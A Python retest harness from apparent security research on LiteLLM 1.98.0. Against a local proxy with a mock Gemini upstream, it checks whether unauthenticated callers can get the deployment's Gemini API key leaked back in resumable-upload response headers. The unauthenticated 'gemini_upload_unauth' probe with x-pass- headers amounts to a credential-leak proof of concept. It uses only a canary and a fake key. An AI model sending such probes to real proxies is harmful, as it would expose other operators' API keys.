#!/usr/bin/env python3
"""028 retest on LiteLLM 1.98.0 WITH master_key.

Re-runs the existing 028 mock upload leak path (echo_upstream.py canary echoed
into location / x-goog-upload-url) against a proxy that now has a master_key
set. Measures whether an unauthenticated caller (no Authorization) still gets
the deployment GEMINI_API_KEY canary, versus authenticated callers.

Reuses the mock (transcripts/028/echo_upstream.py) and canary
(GEMINI_API_KEY=CANARY_GEMINI_PASSTHROUGH_KEY). Never hits live Google.

Layout expected while running:
  - echo_upstream.py on :9996  (mock Gemini upstream)
  - litellm --config litellm-mock-master-key.yaml --port 4000
      env GEMINI_API_KEY=CANARY_GEMINI_PASSTHROUGH_KEY
          GEMINI_API_BASE=http://127.0.0.1:9996
  - litellm --config litellm-mock-master-key.yaml --port 4001
      env GEMINI_API_KEY=CANARY_GEMINI_PASSTHROUGH_KEY
          GEMINI_API_BASE=http://127.0.0.1:1   (closed-port control)
"""
from __future__ import annotations

import json
import urllib.error
import urllib.request
from pathlib import Path

OUT = Path("transcripts/028")
N = 5

MASTER_KEY = "sk-kairo-master-test"
CANARY = "CANARY_GEMINI_PASSTHROUGH_KEY"

LL_MOCK = "http://127.0.0.1:4000"
LL_CLOSED = "http://127.0.0.1:4001"

# Headers on the leaked response we care about (Google resumable-start URLs).
LEAK_HEADERS = ("location", "x-goog-upload-url", "x-goog-upload-control-url")

# Documented x-pass- resumable start headers (same as hunt_round2.py live leak).
RESUMABLE = {
    "x-pass-x-goog-upload-protocol": "resumable",
    "x-pass-x-goog-upload-command": "start",
    "x-pass-x-goog-upload-header-content-length": "8",
    "x-pass-x-goog-upload-header-content-type": "text/plain",
    "content-type": "application/json",
}
UPLOAD_BODY = b'{"file":{"display_name":"kairo-1.98.0-master-key"}}'
GEN_BODY = b'{"contents":[{"role":"user","parts":[{"text":"ping"}]}]}'


def redact(text: str) -> str:
    # No real secrets in this harness; still scrub the fake master key value so
    # transcripts never carry a credential-looking token (mirrors
    # live-upload-redacted.json). The synthetic CANARY is left visible on
    # purpose: showing it in a client-visible header IS the finding.
    return text.replace(MASTER_KEY, "REDACTED_MASTER_KEY")


def canary_headers(headers: dict) -> list[str]:
    return [k for k, v in headers.items() if CANARY in v]


def call(
    method: str,
    url: str,
    headers: dict | None = None,
    raw: bytes | None = None,
    timeout: float = 20.0,
) -> dict:
    hdrs = dict(headers or {})
    req = urllib.request.Request(url, data=raw, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", "replace")
            rh = {k: v for k, v in resp.headers.items()}
            return {"status": resp.status, "headers": rh, "body": body}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        rh = {k: v for k, v in e.headers.items()} if e.headers else {}
        return {"status": e.code, "headers": rh, "body": body}
    except Exception as e:  # noqa: BLE001
        return {"status": None, "headers": {}, "body": f"{type(e).__name__}: {e}"}


def slim(resp: dict) -> dict:
    headers = resp.get("headers") or {}
    ch = canary_headers(headers)
    return {
        "status": resp.get("status"),
        "canary_in_response_headers": bool(ch),
        "canary_headers": ch,
        "canary_leak_headers_present": {h: (CANARY in headers.get(h, "")) for h in LEAK_HEADERS},
        "headers": {k: redact(v) for k, v in headers.items()},
        "body": redact(resp.get("body") or "")[:1200],
    }


def main() -> None:
    # Each probe: (name, base, method, path, headers, raw)
    probes = [
        # --- primary: gemini resumable upload leak path, master_key set ---
        ("gemini_upload_unauth", LL_MOCK, "POST", "/gemini/upload/v1beta/files", dict(RESUMABLE), UPLOAD_BODY),
        (
            "gemini_upload_auth_bearer",
            LL_MOCK,
            "POST",
            "/gemini/upload/v1beta/files",
            {**RESUMABLE, "Authorization": f"Bearer {MASTER_KEY}"},
            UPLOAD_BODY,
        ),
        (
            "gemini_upload_auth_xgoog_api_key",
            LL_MOCK,
            "POST",
            "/gemini/upload/v1beta/files",
            {**RESUMABLE, "x-goog-api-key": MASTER_KEY},
            UPLOAD_BODY,
        ),
        (
            "gemini_upload_auth_key_query",
            LL_MOCK,
            "POST",
            f"/gemini/upload/v1beta/files?key={MASTER_KEY}",
            dict(RESUMABLE),
            UPLOAD_BODY,
        ),
        # --- controls ---
        (
            "chat_control_unauth",
            LL_MOCK,
            "POST",
            "/v1/chat/completions",
            {"content-type": "application/json"},
            b'{"model":"mock","messages":[{"role":"user","content":"ping"}],"max_tokens":8}',
        ),
        (
            "chat_control_auth",
            LL_MOCK,
            "POST",
            "/v1/chat/completions",
            {"content-type": "application/json", "Authorization": f"Bearer {MASTER_KEY}"},
            b'{"model":"mock","messages":[{"role":"user","content":"ping"}],"max_tokens":8}',
        ),
        (
            "closed_port_control_auth_xgoog",
            LL_CLOSED,
            "POST",
            "/gemini/v1beta/models/gemini-2.5-flash:generateContent",
            {"x-goog-api-key": MASTER_KEY, "content-type": "application/json"},
            GEN_BODY,
        ),
    ]

    rows = []
    for run in range(1, N + 1):
        for name, base, method, path, headers, raw in probes:
            resp = call(method, base + path, headers=headers, raw=raw)
            rows.append({"probe": name, "run": run, **slim(resp)})

    (OUT / "v1.98.0-master-key-results.json").write_text(json.dumps(rows, indent=2))

    summary = {}
    for row in rows:
        b = summary.setdefault(
            row["probe"],
            {"n": 0, "statuses": {}, "canary_leak_runs": 0, "canary_headers": {}},
        )
        b["n"] += 1
        st = str(row["status"])
        b["statuses"][st] = b["statuses"].get(st, 0) + 1
        if row["canary_in_response_headers"]:
            b["canary_leak_runs"] += 1
        for h in row["canary_headers"]:
            b["canary_headers"][h] = b["canary_headers"].get(h, 0) + 1
    (OUT / "v1.98.0-master-key-scoreboard.json").write_text(json.dumps(summary, indent=2))
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
